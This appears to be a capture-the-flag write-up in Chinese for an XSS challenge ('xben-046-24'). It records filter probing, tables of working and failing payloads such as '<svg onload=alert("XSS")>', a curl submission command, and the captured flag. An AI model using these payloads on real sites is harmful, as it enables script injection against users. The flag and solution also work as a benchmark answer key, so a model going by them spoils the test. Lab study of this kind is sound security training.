# xben-046-24 · 探索记录

对应题解：[`xben-046-24.md`](./xben-046-24.md)

## 目标与起点

`Werkzeug/1.0.1 Python/2.7.18`，`GET /page?name=…`，样式 `xss14.css`，标题
`Dalgona - Triangle`。与同族 004/008/010/011/012/013/015/016 同一套靶场。

## 第一阶段：逐字符探测

把每个可打印字符夹在 `Q…Q` 之间提交，看反射是否被改写：

```text
altered chars: ['/', '?']
```

即**只删 `/` 和 `?`**，其余（空格、引号、`<`、`>`、`=`、`;`）全部保留。

## 第二阶段：验证自闭合写法会被破坏

| 输入 | 反射 |
| --- | --- |
| `<svg/onload=alert("XSS")` | `<svgonload=alert("XSS")` |
| `<svg/onload=alert("XSS")>` | `<svgonload=alert("XSS")>` |

斜杠被删后标签名变成 `svgonload=…`，不再成立。

## 第三阶段：空格分隔

| payload | 结果 |
| --- | --- |
| `<svg onload=alert("XSS")>` | **Congratulations** |
| `<svg onload=alert("XSS")` | **Congratulations** |
| `<body onload=alert("XSS")>` | **Congratulations** |
| `<img src=x onerror=alert("XSS")>` | 失败 |
| `<input autofocus onfocus=alert("XSS")>` | 失败 |

`svg` / `body` 的 `onload` 生效；`img onerror` 与 `input onfocus` 反而失败。

## 第四阶段：拿 flag

```bash
curl --get --data-urlencode 'name=<svg onload=alert("XSS")>' http://$T/page
```

```text
flag{a9fa9436-adac-45af-90b3-465f0618ee61}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `<svg/onload=…>`（自闭合） | 标签名被拼成 `svgonload` | `/` 被删 |
| `<img src=x onerror=…>` | 未触发 | 本关判据不接受该组合 |
| `<input autofocus onfocus=…>` | 未触发 | 同族 004/008 的解法在这里失效 |
| 含 `?` 的 payload（如 `javascript:…`） | `?` 被删 | 过滤字符集 |

## 这次真正的收获

1. **逐字符探测是这类题最稳的第一步。** 94 次请求就得到精确的黑名单字符集，
   直接排除「关键字过滤」这种更复杂的假设。
2. **`/` 被删不等于自闭合可行。** 空格是合法的属性分隔符，`<svg onload=…>`
   完全等价，所以「只防斜杠」的过滤没有实际防护效果。
3. **同族经验要重测。** 004/008 的 `autofocus+onfocus`、`img onerror` 在这里都不成立，
   只有 `svg/body + onload` 通过。说明判据比「能触发事件」更严格。
4. **过滤规则在族内几乎没有重复。** 已解各关：004/008 拦 `script/onerror/onload`、
   010 拦全部字母数字、011/015 删 `<[^>]+>`、012 删标签前缀+带引号 XSS、
   013 拦 `alert/confirm`、016 拦空白、046 只删 `/` 和 `?`。
